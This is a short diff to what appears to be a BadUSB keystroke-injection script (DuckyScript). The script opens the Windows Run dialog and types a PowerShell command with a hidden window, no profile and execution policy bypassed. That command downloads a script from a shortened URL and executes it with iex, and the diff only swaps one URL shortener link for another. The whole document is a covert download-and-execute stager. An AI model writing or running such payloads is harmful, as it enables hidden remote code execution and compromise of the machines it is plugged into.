@@ -12,5 +12,5 @@ REM     ------------------------------------------------------------------------
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass iwr shorturl.at/eAMQS | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass iwr https://tinyurl.com/2p8m73te | iex
 ENTER
